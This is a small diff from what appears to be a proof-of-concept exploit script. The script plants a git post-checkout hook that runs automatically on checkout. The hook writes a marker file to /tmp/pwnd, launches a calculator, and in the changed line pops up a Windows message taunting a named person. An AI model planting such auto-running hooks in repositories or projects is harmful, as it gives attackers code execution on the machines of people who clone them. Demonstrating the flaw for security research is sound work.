@@ -19,7 +19,7 @@ mkdir -p y/hooks
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
 echo "amal_was_here" > /tmp/pwnd
-calc.exe
+msg %USERNAME% 李金龙就是歌姬吧!
 open -a Calculator.app
 EOF
 
